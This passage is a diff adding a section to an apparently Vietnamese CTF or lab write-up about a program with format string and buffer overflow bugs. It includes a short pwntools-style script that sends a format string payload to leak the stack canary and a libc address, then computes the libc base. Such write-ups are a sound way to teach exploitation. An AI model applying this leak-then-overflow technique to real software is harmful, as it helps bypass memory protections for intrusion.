@@ -203,3 +203,18 @@ Chương trình này có lỗ hổng format string và buffer overflow. Hãy xem
 
 ![Alt text](image/fs14.png)
 
+Chương trình có cơ chế bảo mật Canary nên đầu tiên để thuận lợi cho việc khai thác bof thì cần leak canary trước.
+Bên cạnh đó trong Stack có thể leak luôn địa chỉ libc. Ta có thể sẽ cần dùng đến nó.
+
+	ID=b'01234456789'
+	ID+=b'%21$p%23$p'				//format leak canary và libc
+	p.sendafter(b'ID: ',ID)
+	p.sendafter(b'Password: ',b'&WPAbC&M!%8S5X#W')
+	p.recvuntil(b'01234456789')
+	data=p.recvuntil(b'Enter',drop=True).split(b'0x')	//chia dữ liệu nhận về thành 1 mảng data
+	canary=int(data[1],16)								//phần tử 1 chứa canary
+	libc_leak=int(data[2],16)							//phần tử 2 chứa libc
+	libc.address=libc_leak-0x24083
+
+Sau khi đã leak được các yếu tố cần thiết thì hãy quay lại Stack lần nữa để xem chúng ta có thể ghi đè đến đâu qua bof.
+
